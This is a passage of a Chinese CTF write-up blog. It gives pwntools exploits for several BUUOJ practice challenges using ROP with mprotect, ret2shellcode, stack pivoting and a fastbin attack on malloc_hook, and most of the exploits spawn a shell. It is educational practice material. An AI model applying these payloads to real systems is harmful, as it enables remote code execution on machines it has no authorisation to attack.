class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">0x38</span></span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-not-the-same-3dsctf-2016"><a href="#8-not-the-same-3dsctf-2016" class="headerlink" title="8.not_the_same_3dsctf_2016"></a>8.not_the_same_3dsctf_2016</h2><p>同上一个题，只是数据换了一下，注意偏移</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./1'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27353</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x0806fcf0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * (<span class="number">0x2d</span>)</span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="9-ez-pz-hackover-2016"><a href="#9-ez-pz-hackover-2016" class="headerlink" title="9.ez_pz_hackover_2016"></a>9.ez_pz_hackover_2016</h2><p>此题位ret2shellcode</p><p>但是不知道为真么无法调用s所在栈的shellcode</p><p>只能利用copy进去的覆盖了s之前的内容的shellcode</p><p>为两个参数加ret加ebp加三个参数共7*4=0x1c</p><p>指向stack_addr-0x1c这里才可，但是为啥s的栈不行呢，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',27543)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Yippie, lets crash: 0x"</span>)</span><br><span class="line"></span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"crashme\x00"</span>+<span class="string">'a'</span>*<span class="number">18</span>+p32(stack_addr<span class="number">-0x1c</span>)+shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x8048601")</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x80485f8")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="10-ciscn-2019-es-2"><a href="#10-ciscn-2019-es-2" class="headerlink" title="10.ciscn_2019_es_2"></a>10.ciscn_2019_es_2</h2><p>32位程序，开了NX保护（堆栈不可执行）</p><p>看程序可以发现存在两次写入以及printf</p><p>我们发现有个hack函数。但是溢出后发现并不能获取flag</p><p>因此我们可以写入shell</p><p>但同时，我们发现我们能输入的字符数量不多</p><p>因此我们可以利用栈迁移来进行getshell</p><h3 id="先补充知识点：栈迁移"><a href="#先补充知识点：栈迁移" class="headerlink" title="先补充知识点：栈迁移"></a>先补充知识点：栈迁移</h3><p><a href="https://blog.csdn.net/zszcr/article/details/79841848" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79841848</a></p><p>可以根据这篇博客学习怎样使用栈迁移以及他的重复循环利用方法</p><p>总之：</p><p>1.使用leave_ret</p><ul><li><p>栈迁移主要是为了解决可溢出空间大小不足的问题</p></li><li><p>原理：覆盖ebp为fake_ebp，然后利用leavel ; ret ; 把esp劫持到fake_ebp上去</p></li><li><p>leave ret相当于</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov $esp, $ebp; 用ebp的值写入esp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop $ebp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop $eip</span><br></pre></td></tr></table></figure><p>2.模板</p><p>payload=’a’ * 4或者8或者要迁移目标的ebp/rbp地址 + ret（想要执行的函数）+leave_ret + 参数参数…以此类推</p><p>若想重复挟持可以使用read函数，详见上面的网址</p><p>本题：</p><p>1.我们先使用printf泄露我们的ebp</p><p>2.ebp即为我们的栈地址，可以通过调试获取esp相对于栈地址的偏移，也可以自己想，，</p><p>3.构造payload，因为题目中有system，所以不用泄露libc地址</p><p>直接栈向前迁移，然后调用system执行我们写入的/bin/sh即可</p><p>具体解释在exp中</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_plt=0x8048400 </span></span><br><span class="line"></span><br><span class="line">sys_add=<span class="number">0x8048559</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_plt)+'cccc'+p32(ebp-0x1c)+'/bin/sh\x00').ljust(0x28,'p')+p32(ebp-0x2c)</span></span><br><span class="line"><span class="comment">#这里我们使用的是sys_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">'a'</span>*<span class="number">8</span>+p32(ebp<span class="number">-0x24</span>)+<span class="string">'bbbb'</span>+p32(sys_add)+p32(ebp<span class="number">-0x20</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)+p32(ebp<span class="number">-0x2c</span>)</span><br><span class="line"><span class="comment">#这里我们使用的是程序自带的指令call system</span></span><br><span class="line"><span class="comment">#我们来看这个payload，我们将ebp覆盖为ebp-0x2c，（偏移根据调试得到的），就将栈向前到了bbbb之前，</span></span><br><span class="line"><span class="comment">#bbbb就是新的ebp，ret就是sys_add,（这里不需要构造返回地址），然后参数为ebp-0x1c处的字符串，即为我们的</span></span><br><span class="line"><span class="comment">#/bin/sh，成功getshell</span></span><br><span class="line"><span class="comment">#注意：</span></span><br><span class="line"><span class="comment">#这里的原来的栈的ret没有覆盖为leave_ret的原因是本来就是leave_ret</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">"b *0x80485fc"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完成，撒花=、=</p><h2 id="11-2017-0ctf-babyheap"><a href="#11-2017-0ctf-babyheap" class="headerlink" title="11.2017 0ctf babyheap"></a>11.2017 0ctf babyheap</h2><p>方法一：</p><p>1，使用unsort bin修露libc</p><p>2.使用malloc_hook与one gadget  getshell</p><p>方法二：</p><p>1.通过堆块重叠泄露libc基地址</p><p>2.使用malloc_hook与one gadget  getshell</p><p>参考博客：</p><p><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/66476135</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"><span class="comment">#ip = ''</span></span><br><span class="line"><span class="comment">#port = ''</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(len(content)))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="comment">#leek libc</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=1</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=3</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#index=4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload2)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload3)</span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#这里是为了防止top chunk合并free的small bin（index=4）</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('\x00' * 0x)</span></span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"main_arena: "</span>+hex(main_arena))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7fffff3f4b78</span> - <span class="number">88</span> - <span class="number">0x7fffff030000</span></span><br><span class="line">log.info(<span class="string">"offset: "</span>+hex(offset))</span><br><span class="line">libc_base = main_arena - <span class="number">88</span> -offset</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">"malloc_hook: "</span>+hex(malloc_hook))</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="keyword">print</span> hex(one_gadget)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4 = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#这里是我们的malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4 = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x50</span>)<span class="comment">#getshell</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="12-铁人三项第五赛区-rop"><a href="#12-铁人三项第五赛区-rop" class="headerlink" title="12.铁人三项第五赛区 rop"></a>12.铁人三项第五赛区 rop</h2><p>注意32位程序调用函数时要构造返回地址，有时还需要注意堆栈平衡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./2'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'29633'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">libc_start_main_add = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_add = <span class="number">0x80484c6</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) +p32(main_add) + p32(<span class="number">1</span>) + p32(libc_start_main_add) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_start = u32(p.recv(<span class="number">4</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"libc_start: "</span>+hex(libc_start))</span><br><span class="line">libc=LibcSearcher(<span class="string">'__libc_start_main'</span>,int(libc_start))</span><br><span class="line">libc_base = libc_start - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system_add: "</span>+hex(sys_add))</span><br><span class="line">log.success(<span class="string">"bin_sh_add: "</span>+hex(bin_sh_add))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(sys_add)+ p32(main_add) + p32(bin_sh_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="13-buu-0ctf2016-fheap"><a href="#13-buu-0ctf2016-fheap" class="headerlink" title="13.buu 0ctf2016 fheap"></a>13.buu 0ctf2016 fheap</h2><p>步骤：<br>1.利用堆溢出与短字节覆盖教free所在函数的地址变为put函数，获得程序的基地址</p><p>2.利用同样的方法更改为printf函数，构造格式化字符串漏洞</p><p>3.根据格式化字符串获取libc基地址</p><p>4.同样利用堆溢出漏洞getshell</p><p>这道题漏洞好利用，主要是这个调试太恶心，不过也可以锻炼一下动态调试的水平</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 